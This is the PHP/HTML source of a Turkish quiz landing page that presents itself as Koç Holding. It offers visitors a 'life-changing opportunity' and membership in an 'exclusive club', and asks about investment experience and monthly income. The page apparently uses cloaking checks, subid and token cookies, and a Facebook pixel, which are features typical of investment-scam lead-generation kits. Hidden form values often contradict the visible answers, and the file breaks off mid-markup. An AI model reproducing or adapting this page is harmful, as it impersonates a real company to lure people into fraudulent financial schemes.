<?php
if (!isset($rawClick) && !isset($click)) {
  die();
}
?>
<?php

include_once dirname(__FILE__) . '/config.php';

?>
<!DOCTYPE html>
<html
  lang="tr"
  style="background-color: rgb(255, 255, 255)"
  class="wf-inter-n4-active wf-inter-n6-active wf-inter-n7-active wf-active"
>
  <head>
    <style>
      .overlay-YJjMwyWBsX {
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: rgba(0, 0, 0, 0.8);
        z-index: 1000;
        -webkit-box-pack: center;
        -webkit-justify-content: center;
        -ms-flex-pack: center;
        justify-content: center;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        overflow-y: auto;
        display: none;
      }

      .lds-spinner-YJjMwyWBsX {
        color: official;
        display: inline-block;
        position: relative;
        width: 80px;
        height: 80px;
      }

      .lds-spinner-YJjMwyWBsX div {
        transform-origin: 40px 40px;
        animation: lds-spinner-YJjMwyWBsX 1.2s linear infinite;
      }

      .lds-spinner-YJjMwyWBsX div:after {
        content: " ";
        display: block;
        position: absolute;
        top: 3px;
        left: 37px;
        width: 6px;
        height: 18px;
        border-radius: 20%;
        background: #fff;
      }

      .lds-spinner-YJjMwyWBsX div:nth-child(1) {
        transform: rotate(0deg);
        animation-delay: -1.1s;
      }

      .lds-spinner-YJjMwyWBsX div:nth-child(2) {
        transform: rotate(30deg);
        animation-delay: -1s;
      }

      .lds-spinner-YJjMwyWBsX div:nth-child(3) {
        transform: rotate(60deg);
        animation-delay: -0.9s;
      }

      .lds-spinner-YJjMwyWBsX div:nth-child(4) {
        transform: rotate(90deg);
        animation-delay: -0.8s;
      }

      .lds-spinner-YJjMwyWBsX div:nth-child(5) {
        transform: rotate(120deg);
        animation-delay: -0.7s;
      }

      .lds-spinner-YJjMwyWBsX div:nth-child(6) {
        transform: rotate(150deg);
        animation-delay: -0.6s;
      }

      .lds-spinner-YJjMwyWBsX div:nth-child(7) {
        transform: rotate(180deg);
        animation-delay: -0.5s;
      }

      .lds-spinner-YJjMwyWBsX div:nth-child(8) {
        transform: rotate(210deg);
        animation-delay: -0.4s;
      }

      .lds-spinner-YJjMwyWBsX div:nth-child(9) {
        transform: rotate(240deg);
        animation-delay: -0.3s;
      }

      .lds-spinner-YJjMwyWBsX div:nth-child(10) {
        transform: rotate(270deg);
        animation-delay: -0.2s;
      }

      .lds-spinner-YJjMwyWBsX div:nth-child(11) {
        transform: rotate(300deg);
        animation-delay: -0.1s;
      }

      .lds-spinner-YJjMwyWBsX div:nth-child(12) {
        transform: rotate(330deg);
        animation-delay: 0s;
      }

      @keyframes lds-spinner-YJjMwyWBsX {
        0% {
          opacity: 1;
        }

        100% {
          opacity: 0;
        }
      }

      .visible-YJjMwyWBsX {
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
      }
    </style>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Koç Holding</title>
    <link href="css/app.css" rel="stylesheet" />
    <link href="css/bootstrap.min.css" rel="stylesheet" />
    <link rel="stylesheet" href="css/leadForm.css" />
    <link rel="shortcut icon" href="images/favicon.ico" type="image/x-icon" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="" />
    <link
      href="https://fonts.googleapis.com/css2?family=Inter:wght@100..900&display=swap"
      rel="stylesheet"
    />

    <style>
      input#sendForm {
        color: #fff !important;
        background-color: #ff5100 !important;
      }
    </style>

    <style>
      b,
      h1,
      h2,
      h3,
      h4,
      h5,
      p,
      a,
      span,
      div,
      input,
      button,
      form,
      * {
        font-family: "Inter", sans-serif !important;
      }

      body #app input {
        outline: none !important;
      }

      .mainElements {
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        height: 100vh;
        width: 100%;
      }

      .start-page__body {
        margin: 0 auto;
      }
    </style>
    <script src="jquery-3.6.1.min.js"></script>

    <script src="form/js/libs/intlTelInput.js"></script>

    <script src="form/js/libs/jquery.maskedinput.js"></script>
    <script src="form/js/libs/utils.js"></script>

    <script type="application/javascript">
      function getCookie(name) {
        var v = document.cookie.match("(^|;) ?" + name + "=([^;]*)(;|$)");
        return v ? v[2] : null;
      }

      function setCookie(name, value, days) {
        var d = new Date();
        d.setTime(d.getTime() + 24 * 60 * 60 * 1000 * days);
        document.cookie =
          name + "=" + value + ";path=/;expires=" + d.toGMTString();
      }

      function getSubId() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{subid}".match("{")) {
          return "{subid}";
        }
        var clientSubid =
          '<?php echo isset($client) ? $client->getSubid() : "" ?>';
        if (!clientSubid.match(">")) {
          return clientSubid;
        }
        if (params.get("_subid")) {
          return params.get("_subid");
        }
        if (params.get("subid")) {
          return params.get("subid");
        }
        if (getCookie("subid")) {
          return getCookie("subid");
        }
      }

      function getToken() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{token}".match("{")) {
          return "{token}";
        }
        var clientToken =
          '<?php echo isset($client) ? $client->getToken() : "" ?>';
        if (!clientToken.match(">")) {
          return clientToken;
        }
        if (params.get("_token")) {
          return params.get("_token");
        }
        if (params.get("token")) {
          return params.get("token");
        }
        if (getCookie("token")) {
          return getCookie("token");
        }
        return null;
      }

      function getPixel() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{pixel}".match("{")) {
          return "{pixel}";
        }
        if (params.get("pixel")) {
          return params.get("pixel");
        }

        if (getCookie("pixel")) {
          return getCookie("pixel");
        }

        return null;
      }

      if (typeof URLSearchParams === "function") {
        document.addEventListener("DOMContentLoaded", function (event) {
          var params = new URLSearchParams(document.location.search.substr(1));
          var subid = getSubId();
          var token = getToken();
          var pixel = getPixel();

          params.set("_token", token);
          setCookie("pixel", pixel);
          setCookie("token", token);
          setCookie("subid", subid);
        });
      }
    </script>

    <!--PIXEL DEFENCE-->
    <?php if($FacebookPixel): ?>
    <script type="application/javascript">
      !(function (f, b, e, v, n, t, s) {
        if (f.fbq) return;
        n = f.fbq = function () {
          n.callMethod
            ? n.callMethod.apply(n, arguments)
            : n.queue.push(arguments);
        };
        if (!f._fbq) f._fbq = n;
        n.push = n;
        n.loaded = !0;
        n.version = "2.0";
        n.queue = [];
        t = b.createElement(e);
        t.async = !0;
        t.src = v;
        s = b.getElementsByTagName(e)[0];
        s.parentNode.insertBefore(t, s);
      })(
        window,
        document,
        "script",
        "https://connect.facebook.net/en_US/fbevents.js"
      );
      fbq("init", "<?=$FacebookPixel ?>");
      fbq("track", "PageView");
    </script>
    <?php endif; ?>
  </head>

  <body style="background-color: rgb(255, 255, 255)">
    <div
      class="app-wrapper light-blue"
      style="
        --color: #142143;
        --color-lighten: #c9ac14;
        --color-lighten10: #fae057;
        --color-lighten2: #fae057;
        --color-darken: #002d75;
        --color-darken10: #0041a8;
        --color-alpha: rgba(0, 84, 221, 0.5);
        --color-alpha2: rgba(0, 84, 221, 0.2);
        --color-alpha3: rgba(0, 84, 221, 0.05);
        --color-text: #ffffff;
        --color-text2: #0054dd;
        --gradient-main: 331deg, rgb(0, 45, 117), rgb(66, 139, 255);
        --color-primary-text-button: #fff;
        --color-bg-sidebar: #f7f7f7;
        --color-bg-1: #ededed;
        --color-bg-2: #e6e6e6;
        --color-bg-3: #cccccc;
        --color-bg-4: #b3b3b3;
        --color-bg-5: #999999;
        --color-bg-6: rgba(0, 0, 0, 0.7);
        --color-bg-7: #ededed;
        --color-bg-8: #d9d9d9;
        --color-bg-9: #363636;
        --color-bg-text: #000000;
        --color-bg-quiz: #ffffff;
        --color-bg-alpha0: rgba(255, 255, 255, 0);
        --color-bg-alpha2: rgba(0, 0, 0, 0.2);
        --color-bg-alpha7: rgba(0, 0, 0, 0.7);
        --color-white-label: #ffffff;
        --color-bg-sub-text: #a6a6a6;
      "
    >
      <div id="app" class="app">
        <div class="layout" id="mainForm">
          <div class="app__start-page test-step active">
            <div class="mainElements">
              <div class="head-logo" style="position: relative">
                <div class="b-quiz-question__title">
                  <div class="logo__img">
                    <img src="images/logoWhite.svg" />
                  </div>
                  <div
                    id="start-menu"
                    class="nav-menu"
                    style="display: flex; width: 50%; justify-content: flex-end"
                  >
                    <div
                      class="phone__img"
                      style="align-self: center; padding: 0 15px"
                    >
                      <img width="24" height="24" src="images/icon-call.svg" />
                    </div>
                    <div
                      style="
                        margin-right: 20px !important;
                        align-self: center;
                        padding: 0 15px;
                      "
                    >
                      <svg
                        width="24"
                        height="24"
                        fill="white"
                        viewBox="0 0 20 20"
                        xmlns="http://www.w3.org/2000/svg"
                      >
                        <rect y="9" width="20" height="2"></rect>
                        <rect y="3" width="20" height="2"></rect>
                        <rect y="15" width="20" height="2"></rect>
                      </svg>
                    </div>
                  </div>
                </div>
              </div>

              <div class="video-background">
                <video
                  playsinline="playsinline"
                  autoplay="autoplay"
                  muted="muted"
                  loop="loop"
                  poster="_preview.png"
                >
                  <source src="media/video.mp4" type="video/mp4" />
                </video>
              </div>

              <div class="video-background-mobile">
                <video
                  playsinline="playsinline"
                  autoplay="autoplay"
                  muted="muted"
                  loop="loop"
                >
                  <source src="media/video.mp4" type="video/mp4" />
                </video>
              </div>

              <div
                class=""
                style="z-index: 100; left: 1px !important; max-width: 100%"
              >
                <div class="start-page__body">
                  <div
                    class="start-page__line mobH"
                    style="width: 60px; display: block"
                  ></div>
                  <img
                    src="images/logo.svg"
                    style="
                      max-width: 100%;
                      position: fixed;
                      left: 50%;
                      top: 50px;
                      transform: translate(-50%, -50%);
                    "
                    alt="Koç Holding"
                  />
                  <h1
                    class="start-page__header mobH"
                    style="max-width: 700px; margin: 0px auto; display: block"
                  >
                    Eğer hayatınızı değiştirecek bir fırsat sunduğumuzu
                    söylesek?
                  </h1>
                </div>
              </div>
              <div class="" style="z-index: 100">
                <div class="start-page__body">
                  <div class="start-page__line"></div>
                  <h1
                    class="start-page__header"
                    style="max-width: 500px; margin: 0 auto"
                  >
                    Koç Holding ile yaşam standartlarınızı bir üst seviyeye
                    taşıyın!
                  </h1>
                  <h2 class="start-page__subheader">
                    Anketi tamamlayın ve size özel fırsatlar ile daha konforlu
                    bir yaşama doğru ilk adımınızı atın.
                  </h2>

                  <button
                    type="button"
                    class="start-page__button button is-primary is-blicked has-light-shadow next-btn"
                  >
                    <span class="icon">
                      <svg viewBox="0 0 24 24" class="mdi-icon mdi-24px">
                        <title>mdi-checkbox-marked-circle-outline</title>
                        <path
                          d="M20,12C20,16.42 16.42,20 12,20C7.58,20 4,16.42 4,12C4,7.58 7.58,4 12,4C12.76,4 13.5,4.11 14.2,4.31L15.77,2.74C14.61,2.26 13.34,2 12,2C6.48,2 2,6.48 2,12C2,17.52 6.48,22 12,22C17.52,22 22,17.52 22,12M7.91,10.08L6.5,11.5L11,16L21,6L19.59,4.58L11,13.17L7.91,10.08Z"
                          stroke-width="0"
                          fill-rule="nonzero"
                        ></path>
                      </svg>
                    </span>
                      Teste başla
                  </button>
                </div>
              </div>

              <!-- <div class="start-page__layer"></div> -->
            </div>
          </div>

          <!-- Question 1 -->
          <div class="quiz-container test-step">
            <div class="head-logo" style="z-index: 1000; position: relative">
              <div class="b-quiz-question__title" style="display: flex">
                <div class="logo__img">
                  <img src="images/logoWhite.svg" />
                </div>
              </div>
            </div>
            <div class="quiz">
              <div class="quiz__questions">
                <div class="quiz__questions-header">
                  <div
                    class="title quiz__question-title quiz__question-title_without-title"
                  >
                    <span class="is-block q-uestion"
                      >1. Lüks bir yaşam sizin için ne ifade ediyor?
                    </span>
                  </div>
                </div>
                <div
                  class="question quiz__question question_variants"
                  id="DJ17A5860g"
                >
                  <div class="answer-variants answer-variants_has_image">
                    <div
                      class="answer-variants__group"
                      data-question="Yatırım konusunda deneyiminiz var mı?"
                      data-questionnew="4"
                    >
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Hayır, ama daha fazla bilgi edinmek istiyorum"
                        data-answernew="a"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_4"
                            value="Hayır, ama daha fazla bilgi edinmek istiyorum"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">
                                Kimse için çalışmamak
                              </div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Evet, başarılı"
                        data-answernew="b"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_4"
                            value="Evet, başarılı"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">
                                En yüksek kalitede mülke sahip olmak
                              </div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Evet, başarısız"
                        data-answernew="c"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_4"
                            value="Evet, başarısız"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">
                                Ailenizin ve sizin tüm maddi ihtiyaçlarınızı
                                karşılamak
                              </div>
                            </div>
                          </span>
                        </label>
                      </div>

                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Evet, başarısız"
                        data-answernew="c"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_4"
                            value="Evet, başarısız"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">
                                Çocuklarınızın tüm yaşamları boyunca rahat bir
                                gelecek sağlamasını sağlamak
                              </div>
                            </div>
                          </span>
                        </label>
                      </div>
                    </div>
                    <div class="answer-variants__image">
                      <img
                        src="images/quiz4.webp"
                        alt=""
                        class="answer-variants__image-img"
                      />
                    </div>
                  </div>
                </div>
                <div
                  class="quiz__whitelabel quiz__whitelabel_mobile"
                  style="
                    display: block !important;
                    visibility: visible !important;
                    opacity: 1 !important;
                  "
                ></div>
                <div class="quiz__buttons">
                  <div class="quiz-buttons is-outline">
                    <div class="quiz-buttons__progress">
                      <div class="progress-bar">
                        <div class="progress-bar-circular-steps">
                          <div class="progress-bar-circular-steps__label">
                            Çocuklarınızın tüm yaşamları boyunca rahat bir
                            gelecek sağlamasını sağlamak
                          </div>
                          <div
                            class="progress-bar-circular-steps__gradient-wrapp"
                            style="--left-percent: 0%; --right-percent: 50%"
                          >
                            <div
                              class="progress-bar-circular-steps__steps"
                              style="left: 0px"
                            >
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <!-- Question 2 -->

          <div class="quiz-container test-step">
            <div class="head-logo" style="z-index: 1000; position: relative">
              <div class="b-quiz-question__title" style="display: flex">
                <div class="logo__img">
                  <img src="images/logoWhite.svg" />
                </div>
              </div>
            </div>
            <div class="quiz">
              <div class="quiz__questions">
                <div class="quiz__questions-header">
                  <div
                    class="title quiz__question-title quiz__question-title_without-title"
                  >
                    <span class="is-block q-uestion">
                      2. Sizce Türkiye'de yaşayan her vatandaş kendisine ve
                      ailesine uygun koşullarda konut sağlaması gerekir mi?
                    </span>
                  </div>
                </div>
                <div
                  class="question quiz__question question_variants"
                  id="DJ17A5860g"
                >
                  <div class="answer-variants answer-variants_has_image">
                    <div
                      class="answer-variants__group"
                      data-question="1"
                      data-questionnew="1. Her Turkiye vatandasinin, ulkenin kaynaklarinin ticaretinden gelir elde etmesi gerektigine inaniyor musunuz?"
                    >
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Evet"
                        data-answernew="a"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_1"
                            value="Evet"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">Evet</div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Hayır"
                        data-answernew="b"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_1"
                            value="Hayır"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">Hayır</div>
                            </div>
                          </span>
                        </label>
                      </div>
                    </div>
                    <div class="answer-variants__image">
                      <img
                        src="images/quiz1.png"
                        alt=""
                        class="answer-variants__image-img"
                      />
                    </div>
                  </div>
                </div>
                <div
                  class="quiz__whitelabel quiz__whitelabel_mobile"
                  style="
                    display: block !important;
                    visibility: visible !important;
                    opacity: 1 !important;
                  "
                ></div>
                <div class="quiz__buttons">
                  <div class="quiz-buttons is-outline">
                    <div class="quiz-buttons__progress">
                      <div class="progress-bar">
                        <div class="progress-bar-circular-steps">
                          <div class="progress-bar-circular-steps__label">
                            <span>B</span><span>i</span><span>r</span
                            ><span>i</span><span>n</span><span>c</span
                            ><span>i</span> <span>a</span><span>d</span
                            ><span>i</span><span>m</span>
                          </div>
                          <div
                            class="progress-bar-circular-steps__gradient-wrapp"
                            style="--left-percent: 0%; --right-percent: 50%"
                          >
                            <div
                              class="progress-bar-circular-steps__steps"
                              style="left: 0px"
                            >
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <!-- Question 3 -->
          <div class="quiz-container test-step">
            <div class="head-logo" style="z-index: 1000; position: relative">
              <div class="b-quiz-question__title" style="display: flex">
                <div class="logo__img">
                  <img src="images/logoWhite.svg" />
                </div>
              </div>
            </div>
            <div class="quiz">
              <div class="quiz__questions">
                <div class="quiz__questions-header">
                  <div
                    class="title quiz__question-title quiz__question-title_without-title"
                  >
                    <span class="is-block q-uestion"
                      >3. Aşağıdaki listeden hangisini satın almak istersiniz?
                    </span>
                  </div>
                </div>
                <div
                  class="question quiz__question question_variants"
                  id="DJ17A5860g"
                >
                  <div class="answer-variants answer-variants_has_image">
                    <div
                      class="answer-variants__group"
                      data-question="2. Arzularınızı yerine getirmek için ayda ne kadar para yeterlidir?"
                      data-questionnew="2"
                    >
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="8.000 TL"
                        data-answernew="a"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_2"
                            value="5.000 TL"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">Yeni Araba</div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="16.000 TL"
                        data-answernew="b"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_2"
                            value="10.000 TL"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">Yeni Ev</div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="32.000 TL"
                        data-answernew="c"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_2"
                            value="25.000 TL"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">
                                Kendi İşini Kurmak
                              </div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="40.000 TL üzeri"
                        data-answernew="d"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_2"
                            value="25.000 TL üzeri"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">Hepsi</div>
                            </div>
                          </span>
                        </label>
                      </div>
                    </div>
                    <div class="answer-variants__image">
                      <img
                        src="images/7.webp"
                        alt=""
                        class="answer-variants__image-img"
                      />
                    </div>
                  </div>
                </div>
                <div
                  class="quiz__whitelabel quiz__whitelabel_mobile"
                  style="
                    display: block !important;
                    visibility: visible !important;
                    opacity: 1 !important;
                  "
                ></div>
                <div class="quiz__buttons">
                  <div class="quiz-buttons is-outline">
                    <div class="quiz-buttons__progress">
                      <div class="progress-bar">
                        <div class="progress-bar-circular-steps">
                          <div class="progress-bar-circular-steps__label">
                            <span>İ</span><span>k</span><span>i</span
                            ><span>n</span><span>c</span><span>i</span>
                            <span>a</span><span>d</span><span>i</span
                            ><span>m</span>
                          </div>
                          <div
                            class="progress-bar-circular-steps__gradient-wrapp"
                            style="--left-percent: 0%; --right-percent: 50%"
                          >
                            <div
                              class="progress-bar-circular-steps__steps"
                              style="left: 0px"
                            >
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <!-- Question 4 -->
          <div class="quiz-container test-step">
            <div class="head-logo" style="z-index: 1000; position: relative">
              <div class="b-quiz-question__title" style="display: flex">
                <div class="logo__img">
                  <img src="images/logoWhite.svg" />
                </div>
              </div>
            </div>
            <div class="quiz">
              <div class="quiz__questions">
                <div class="quiz__questions-header">
                  <div
                    class="title quiz__question-title quiz__question-title_without-title"
                  >
                    <span class="is-block q-uestion">
                      4. Türkiye'nin hırslı vatandaşlarının yaşam kalitesini
                      artırmak için tasarlanmış ayrıcalıklı Koç Holding kulübüne
                      katılmaya hazır mısınız?
                    </span>
                  </div>
                </div>
                <div
                  class="question quiz__question question_variants"
                  id="DJ17A5860g"
                >
                  <div class="answer-variants answer-variants_has_image">
                    <div
                      class="answer-variants__group"
                      data-question="Koç Holding projesinden nasıl haberdar oldunuz?"
                      data-questionnew="7"
                    >
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Açık hava reklamcılığı"
                        data-answernew="a"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_7"
                            value="Açık hava reklamcılığı"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">Evet</div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="İnternette reklam"
                        data-answernew="b"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_7"
                            value="İnternette reklam"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">Hayır</div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Arkadaş önerileri ('Koç Holding' platformu katılımcıları)"
                        data-answernew="c"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_7"
                            value="Arkadaş önerileri ('Koç Holding' platformu katılımcıları)"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">Daha fazla detay</div>
                            </div>
                          </span>
                        </label>
                      </div>
                    </div>
                    <div class="answer-variants__image">
                      <img
                        src="images/quiz7.png"
                        alt=""
                        class="answer-variants__image-img"
                      />
                    </div>
                  </div>
                </div>
                <div
                  class="quiz__whitelabel quiz__whitelabel_mobile"
                  style="
                    display: block !important;
                    visibility: visible !important;
                    opacity: 1 !important;
                  "
                ></div>
                <div class="quiz__buttons">
                  <div class="quiz-buttons is-outline">
                    <div class="quiz-buttons__progress">
                      <div class="progress-bar">
                        <div class="progress-bar-circular-steps">
                          <div class="progress-bar-circular-steps__label">
                            <span>Y</span><span>e</span><span>d</span
                            ><span>i</span><span>n</span><span>c</span
                            ><span>i</span> <span>a</span><span>d</span
                            ><span>ı</span><span>m</span>
                          </div>
                          <div
                            class="progress-bar-circular-steps__gradient-wrapp"
                            style="--left-percent: 0%; --right-percent: 50%"
                          >
                            <div
                              class="progress-bar-circular-steps__steps"
                              style="left: 0px"
                            >
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <!-- Question 5 -->
          <div class="quiz-container test-step">
            <div class="head-logo" style="z-index: 1000; position: relative">
              <div class="b-quiz-question__title" style="display: flex">
                <div class="logo__img">
                  <img src="images/logoWhite.svg" />
                </div>
              </div>
            </div>
            <div class="quiz">
              <div class="quiz__questions">
                <div class="quiz__questions-header">
                  <div
                    class="title quiz__question-title quiz__question-title_without-title"
                  >
                    <span class="is-block q-uestion">
                      5. Daha önce Koç Holding’de çalıştınız mı?
                    </span>
                  </div>
                </div>
                <div
                  class="question quiz__question question_variants"
                  id="DJ17A5860g"
                >
                  <div class="answer-variants answer-variants_has_image">
                    <div
                      class="answer-variants__group"
                      data-question="Hangi hisse senetleriyle ilgileniyorsunuz?"
                      data-questionnew="5"
                    >
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Koç Holding hisseleri"
                        data-answernew="a"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_5"
                            value="Koç Holding hisseleri"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">Evet</div>
                            </div>
                          </span>
                        </label>
                      </div>

                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Dünya şirketlerinin hisseleri"
                        data-answernew="b"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_5"
                            value="Dünya şirketlerinin hisseleri"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">Hayır</div>
                            </div>
                          </span>
                        </label>
                      </div>
                    </div>
                    <div class="answer-variants__image">
                      <img
                        src="images/quiz5.png"
                        alt=""
                        class="answer-variants__image-img"
                      />
                    </div>
                  </div>
                </div>
                <div
                  class="quiz__whitelabel quiz__whitelabel_mobile"
                  style="
                    display: block !important;
                    visibility: visible !important;
                    opacity: 1 !important;
                  "
                ></div>
                <div class="quiz__buttons">
                  <div class="quiz-buttons is-outline">
                    <div class="quiz-buttons__progress">
                      <div class="progress-bar">
                        <div class="progress-bar-circular-steps">
                          <div class="progress-bar-circular-steps__label">
                            <span>B</span><span>e</span><span>ş</span
                            ><span>i</span><span>n</span><span>c</span
                            ><span>i</span> <span>a</span><span>d</span
                            ><span>ı</span><span>m</span>
                          </div>
                          <div
                            class="progress-bar-circular-steps__gradient-wrapp"
                            style="--left-percent: 0%; --right-percent: 50%"
                          >
                            <div
                              class="progress-bar-circular-steps__steps"
                              style="left: 0px"
                            >
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
